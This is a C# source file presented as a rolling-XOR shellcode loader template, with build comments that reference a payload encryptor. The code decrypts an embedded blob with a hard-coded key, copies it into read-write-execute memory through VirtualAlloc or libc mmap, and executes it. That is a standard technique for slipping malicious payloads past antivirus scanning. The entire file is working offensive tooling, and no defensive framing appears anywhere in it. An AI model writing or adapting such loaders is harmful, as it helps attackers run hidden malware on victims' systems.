/*
 * xor_loader.cs - rolling multi-byte XOR shellcode loader template (C#)
 * =====================================================================
 * Decrypts an embedded XOR blob (rolling key, length-preserving) and
 * executes it. Windows path: VirtualAlloc RWX. Linux path: libc mmap RWX.
 *
 * Build-time parameters (see payloads/xor_300b.meta.json):
 *   key : a1b2c3d4e5f60718293a4b5c6d7e8f90 (16 B)
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m xor --key-hex -k a1b2...8f90 \
 *       --verify --meta params.json -f c -o payload_inc.h
 *   python3 tools/gen_inc.py xor 300 --lang cs --out loaders/csharp/xor/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -out:xor_loader.exe xor_loader.cs payload_inc.cs
 *   mono xor_loader.exe
 */
using System;
using System.Runtime.InteropServices;

static class XorLoader
{
    static readonly byte[] Key = {
        0xA1, 0xB2, 0xC3, 0xD4, 0xE5, 0xF6, 0x07, 0x18,
        0x29, 0x3A, 0x4B, 0x5C, 0x6D, 0x7E, 0x8F, 0x90
    };

    /* Rolling XOR: byte i is XORed with key[i % keylen]. Length-preserving. */
    static byte[] Decrypt(byte[] ct)
    {
        byte[] pt = new byte[ct.Length];
        for (int i = 0; i < ct.Length; i++)
            pt[i] = (byte)(ct[i] ^ Key[i % Key.Length]);
        return pt;
    }

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
        Console.WriteLine("[+] XOR decrypted " + plain.Length + " bytes");
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
